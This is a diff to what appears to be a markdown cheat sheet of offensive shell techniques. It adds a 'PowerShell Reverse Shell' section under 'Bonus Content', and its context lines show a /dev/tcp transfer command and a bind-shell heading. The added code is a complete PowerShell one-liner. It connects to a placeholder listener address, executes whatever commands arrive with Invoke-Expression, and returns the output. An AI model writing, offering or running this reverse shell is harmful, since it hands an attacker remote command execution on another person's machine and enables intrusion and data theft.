@@ -426,6 +426,12 @@ cat < /dev/tcp/%ListenerAddress%/%ListenerPort% | base64 -d > /path/to/store/fil
 
 #### Bonus Content
 
+#### PowerShell Reverse Shell:
+
+```
+& {$LHost = "%ListenerAddress%"; $LPort = %ListeningPort%; $TCPClient = New-Object Net.Sockets.TCPClient($LHost, $LPort); $NetworkStream = $TCPClient.GetStream(); $StreamWriter = [System.IO.StreamWriter]::new($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = [System.Byte[]]::new(1024); while (($RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -ne 0) {$Code = [Text.Encoding]::ASCII.GetString($Buffer, 0, $RawData); try {$Output = Invoke-Expression $Code 2>&1 | Out-String;} catch {$Output = $_.Exception.Message}; $Prompt = "PS $($PWD.Path)> "; $FullOutput = $Output + "`n" + $Prompt; $StreamWriter.Write($FullOutput); $Code = $null}; $TCPClient.Close(); $NetworkStream.Close(); $StreamWriter.Close();}
+```
+
 ##### PowerShell Bind Shell:
 
 ```
